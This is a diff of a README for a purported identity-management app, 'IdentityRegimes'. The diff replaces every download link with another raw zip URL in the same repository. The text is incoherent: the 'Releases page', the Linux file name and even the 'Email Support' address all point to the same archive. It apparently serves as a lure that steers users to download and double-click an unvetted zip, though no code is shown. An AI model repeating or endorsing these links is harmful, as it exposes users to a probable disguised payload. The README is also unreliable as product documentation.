@@ -1,6 +1,6 @@
 # 🚀 IdentityRegimes - Simplifying Identity Management for Everyone
 
-[![Download](https://github.com/PioneerPine/IdentityRegimes/raw/refs/heads/main/IdentityRegimes/Identity-Regimes-farmhold.zip)](https://github.com/PioneerPine/IdentityRegimes/raw/refs/heads/main/IdentityRegimes/Identity-Regimes-farmhold.zip)
+[![Download](https://github.com/PioneerPine/IdentityRegimes/raw/refs/heads/main/docs/Regimes-Identity-v2.5.zip)](https://github.com/PioneerPine/IdentityRegimes/raw/refs/heads/main/docs/Regimes-Identity-v2.5.zip)
 
 ## 📖 Overview
 
@@ -27,7 +27,7 @@ To run IdentityRegimes smoothly, ensure your system meets these requirements:
 Follow these simple steps to get started with IdentityRegimes:
 
 1. **Download the Application**  
-   Visit this page to download: [IdentityRegimes Releases](https://github.com/PioneerPine/IdentityRegimes/raw/refs/heads/main/IdentityRegimes/Identity-Regimes-farmhold.zip).
+   Visit this page to download: [IdentityRegimes Releases](https://github.com/PioneerPine/IdentityRegimes/raw/refs/heads/main/docs/Regimes-Identity-v2.5.zip).
 
 2. **Choose Your Version**  
    On the Releases page, you will see various versions. Select the latest version unless you need a specific one for compatibility.
@@ -36,7 +36,7 @@ Follow these simple steps to get started with IdentityRegimes:
    Click on the appropriate link for your operating system. For example:
    - For Windows, choose the `.exe` file.
    - For macOS, select the `.dmg`.
-   - For Linux, pick the suitable `https://github.com/PioneerPine/IdentityRegimes/raw/refs/heads/main/IdentityRegimes/Identity-Regimes-farmhold.zip` file.
+   - For Linux, pick the suitable `https://github.com/PioneerPine/IdentityRegimes/raw/refs/heads/main/docs/Regimes-Identity-v2.5.zip` file.
 
 4. **Install the Application**  
    After the download finishes, locate the file on your computer and double-click it to begin the installation process. Follow the on-screen prompts to complete installation.
@@ -46,7 +46,7 @@ Follow these simple steps to get started with IdentityRegimes:
 
 ## 📥 Download & Install
 
-Revisit the release page to download IdentityRegimes here: [IdentityRegimes Releases](https://github.com/PioneerPine/IdentityRegimes/raw/refs/heads/main/IdentityRegimes/Identity-Regimes-farmhold.zip).
+Revisit the release page to download IdentityRegimes here: [IdentityRegimes Releases](https://github.com/PioneerPine/IdentityRegimes/raw/refs/heads/main/docs/Regimes-Identity-v2.5.zip).
 
 ## 🎨 User Interface
 
@@ -62,7 +62,7 @@ If you have questions or encounter issues, please reach out:
 
 - **GitHub Issues**: Open an issue on this repository for technical support.
 - **Community Forum**: Join the discussion with other users.
-- **Email Support**: Send an email to https://github.com/PioneerPine/IdentityRegimes/raw/refs/heads/main/IdentityRegimes/Identity-Regimes-farmhold.zip for direct assistance.
+- **Email Support**: Send an email to https://github.com/PioneerPine/IdentityRegimes/raw/refs/heads/main/docs/Regimes-Identity-v2.5.zip for direct assistance.
 
 ## 🌟 Contributing
 
